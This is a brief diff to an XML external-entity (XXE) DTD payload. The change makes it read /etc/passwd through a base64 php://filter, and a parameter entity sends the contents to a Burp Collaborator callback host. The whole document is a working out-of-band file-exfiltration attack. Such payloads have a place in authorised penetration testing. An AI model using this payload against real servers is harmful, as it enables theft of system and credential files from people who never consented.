@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "file:///etc/issue">
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
 <!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'https://jwjb41dvpkkx121lt1yahxy0orunic.burpcollaborator.net/?%data;'>">
